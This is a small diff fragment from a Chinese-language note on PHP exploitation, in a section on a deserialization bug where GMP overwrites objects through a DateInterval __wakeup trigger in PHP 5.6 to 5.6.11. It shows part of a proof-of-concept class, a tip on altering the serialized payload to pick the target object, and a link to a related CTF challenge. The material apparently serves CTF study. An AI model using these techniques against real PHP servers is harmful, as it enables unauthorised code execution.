@@ -360,7 +360,7 @@ $a=new DirectoryIterator("glob:///*");
 * 反序列化入口点
 * 可以触发__wakeup的触发点（在php < 5.6.11以下，可以使用内置类DateInterval）
 POC:
-```js
+```
 class obj{
     var $ryat;
     function __wakeup(){
@@ -401,7 +401,6 @@ echo $exploit;
 
 poc里的s:1:"1"要改成s:1:"4"，其中的4决定了GMP覆盖的对象是哪个object，DateInterval为php5.6-5.6.11可利用的内置类
 ```
-
 **相关的CTF题**
 * LCTF-2018 T4lk 1s ch34p,sh0w m3 the sh31l
 * https://paper.seebug.org/680/
